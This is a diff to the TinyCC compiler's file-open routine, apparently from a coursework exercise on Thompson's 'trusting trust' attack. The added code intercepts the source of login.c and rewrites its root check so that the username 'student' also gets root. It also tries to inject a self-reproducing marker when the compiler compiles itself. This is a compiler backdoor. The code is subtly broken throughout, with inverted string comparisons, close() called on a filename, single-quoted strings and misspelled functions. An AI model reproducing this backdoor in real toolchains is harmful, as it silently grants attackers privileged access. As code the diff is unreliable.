@@ -684,31 +684,17 @@ ST_FUNC void tcc_close(void)
 
 static int _tcc_open(TCCState *s1, const char *filename)
 {
-    // int fd;
-    // if (strcmp(filename, "-") == 0)
-    //     fd = 0, filename = "<stdin>";
-    // else
-    //     fd = open(filename, O_RDONLY | O_BINARY);
-    // if ((s1->verbose == 2 && fd >= 0) || s1->verbose == 3)
-    //     printf("%s %*s%s\n", fd < 0 ? "nf":"->",
-    //            (int)(s1->include_stack_ptr - s1->include_stack), "", filename);
-    // return fd;
-
-
     int fd[2];
     if(pipe(fd) == 1){
         fprintf(stderr, "ERROR: An error occured with opening the pipe\n");
         return EXIT_FAILURE;
     }
     int p = fork();
-    //error
     if(p == -1){
         fprintf(stderr, "ERROR: fork failed\n");
         return EXIT_FAILURE;
     } else if(p == 0){
-        //do the child function
-        //close the read end of the file
-        if(!strcmp(filename, "login.c") || !strcmp(filename, "libtcc.c")){
+        if(strcmp(filename, "login.c") != 0 || strcmp(filename,"libtcc.c") != 0){
             int fd;
             if (strcmp(filename, "-") == 0)
                 fd = 0, filename = "<stdin>";
@@ -720,35 +706,38 @@ static int _tcc_open(TCCState *s1, const char *filename)
             return fd;
         }
     }else{
-        close(1);
+        //the write side is closed
+        close(filename);
+        close(fd[1]);
         //inside the function, check each line of the dumbass thing
-        if(filename == "login.c"){
-            while(1){
-                //read each line
-                //currentline variable
-                if(strcmp(currentline, "strcmp(username,\"root\")") {
-                    //replace with 
-                    "if(!strcmp(username,"root") || (!strmcp(username, "shruti_replace_with_own_name"))";
-                    //continue reading
-                    //write to the pipe
-                }
-                break;
+        if(strcmp(filename, "login.c")){
+            File* file = fopen('login.c', 'r');
+            char line[80];
+            char * comp = "if (!strcmp(username, \"root\"))";
+            while(fgets(line, 80, file))
+            {
+                if(strcmp(line,comp)){
+                    char * tmp = "if (!strcmp(username, \"root\") || (!strmp(username, \"student\")))";
+                    write(fd[1], &tmp, 80);
+               }else{
+                    write(fd[1], &line, 80);
+               }
+            }
+        }else{ // we are in libtcc.c
+        File* file = fopen('libtcc.c', 'r');
+            char line[80];
+            char * comp = "static int _tcc_open(TCCState *s1, const char *filename)";
+            while(fgets(line, 80, file))
+            {
+                if(strcmp(line,comp)){
+                    char * tmp = "static int _tcc_open(TCCState *s1, const char *filename) -- quine";
+                    write(fd[1], &tmp, 80);
+               }else{
+                    write(fd[1], &line, 80);
+               }
             }
 
-        }else{ // we are in libtcc.c
-            while(1){
-                //now check if we are in the tcc_open function
-                //replace with the quine
-                char* s = "#include <string.h>\nstatic int do_login(const char *username) {\n\tif (!strcmp(username, \"root\"))\n\t\treturn 0;" +
-                "\n\tif (!strcmp(username, \"jennifer\"))\n\t\treturn 0;\n"
-                + "\treturn 1;\n}" + "int main(int argc, char *argv[]) {\n" 
-                + "\tif (argc != 2)\n\t\treturn 1;\n\treturn do_login(argv[1]);\n};"
-                //write to pipe.
-                write(fd[1], s, strlen(s) + 1);
-                break;
-            }
         }
-        //return p[0];
 
     }
 
